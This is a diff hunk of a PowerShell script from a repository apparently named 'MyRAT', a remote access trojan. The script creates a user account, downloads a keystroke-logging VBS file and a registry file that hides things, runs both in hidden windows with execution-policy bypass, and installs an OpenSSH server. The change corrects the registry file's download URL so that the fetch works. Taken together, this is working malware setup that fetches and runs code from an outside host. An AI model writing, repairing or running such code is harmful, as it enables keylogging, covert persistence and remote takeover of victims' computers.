@@ -34,7 +34,7 @@ Create_User -uname $uname -passwd $passwd
 $vbs_script = random_text
 $reg = random_text
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/bruning-frighting/MyRAT/refs/heads/main/keystroke.vbs -OutFile "$vbs_script.vbs"
-Invoke-WebRequest -Uri https://github.com/bruning-frighting/MyRAT/blob/main/reghidden.reg -OutFile "$reg.reg" 
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/bruning-frighting/MyRAT/refs/heads/main/reghidden.reg -OutFile "$reg.reg" 
 powershell -windowstyle hiddne -ep bypass ".\$reg.reg";powershell -windowstyle hidden -ep bypass "$vbs_script.vbs"
 
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
